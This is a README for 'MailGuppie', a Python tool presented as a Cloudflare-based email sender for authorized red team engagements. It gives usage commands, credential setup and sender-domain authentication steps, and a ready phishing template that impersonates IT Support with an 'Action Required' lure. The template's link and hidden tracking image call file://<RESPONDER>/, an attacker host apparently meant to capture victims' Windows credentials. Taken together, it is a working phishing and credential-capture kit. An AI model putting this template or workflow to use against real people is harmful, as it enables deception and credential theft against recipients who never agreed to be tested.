# MailGuppie

Cloudflare Email sender for authorized red team engagements.

Sends per-target HTML email through the Cloudflare Email Service REST API, with per-target
SHA3 tracking hashes, configurable human-paced delays, dry-run preview, and resume support.

```
╔════════════════════════════════════════════════╗
║                  MailGuppie                    ║
╚════════════════════════════════════════════════╝

          ><((((º>   ><((((º>   ><((((º>

usage: MailGuppie.py -t <targets.txt> -r <responder> [options]

  -t, --targets    File containing one target email per line
  -r, --responder  Responder IP or hostname (substituted for <RESPONDER>)
  -c, --config     Email template file (default: config/template.conf)
  -l, --log        Append-only send log (default: send.log)
  --delay          Seconds between sends, supports range (default: 3-8)
  --dry-run        Render the first message and print it without sending
  --resume         Skip targets already marked SENT in the log
```

## Quick Start

**1. Configure credentials**

```bash
cp config/key.conf.example config/key.conf
# edit config/key.conf — add your Cloudflare Account ID and API token
```

Get your **Account ID** from the right sidebar at dash.cloudflare.com.

Create an **API token** at dash.cloudflare.com/profile/api-tokens:
→ Custom token → Permission: Account > Email Send > Edit

**2. Verify your send before going live**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100 --dry-run
```

**3. Send**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100
```

**4. Resume after interruption**

```bash
python3 MailGuppie.py -t targets.txt -r 10.0.1.100 --resume
```

## Templates

Templates live in `config/` and use `# KEY: value` headers followed by an HTML body.

```
# SENDER: noreply@aged-domain.com
# SENDER_NAME: IT Support
# SUBJECT: Action Required — Account Review
# REPLY_TO: helpdesk@aged-domain.com    (optional)

<p>Hello,</p>
<p>Please review your account at <a href="file://<RESPONDER>/login">this link</a>.</p>
<img src="file://<RESPONDER>/track.gif" width="1" height="1">
```

**Available placeholders:**

| Placeholder       | Source                        |
|-------------------|-------------------------------|
| `<RESPONDER>`     | `-r` argument                 |
| `<SHA3_HASH>`     | SHA3-256 of target email (chars 22-42) — unique per target |
| `<TARGET_EMAIL>`  | Target email address          |
| `<SENDER>`        | Template `# SENDER:` header   |
| `<SENDER_NAME>`   | Template `# SENDER_NAME:` header |
| `<SUBJECT>`       | Template `# SUBJECT:` header  |
| any `# KEY:`      | `<KEY>` in the body           |

The `SENDER` address must be on a domain verified in Cloudflare Email Service.

## Send Log

Every send is recorded in `send.log` (tab-separated):

```
SENT    target@corp.com    abc123hash    2026-08-02 14:30:00
FAIL    other@corp.com     def456hash    2026-08-02 14:30:05    [error]
```

Pass `--resume` on subsequent runs to skip already-sent targets.

## Domain Setup

1. Add your sending domain in Cloudflare dashboard → Email → Email Sending
2. Cloudflare provisions DKIM and guides you through SPF/DMARC
3. Set `# SENDER:` in your template to an address on your verified domain
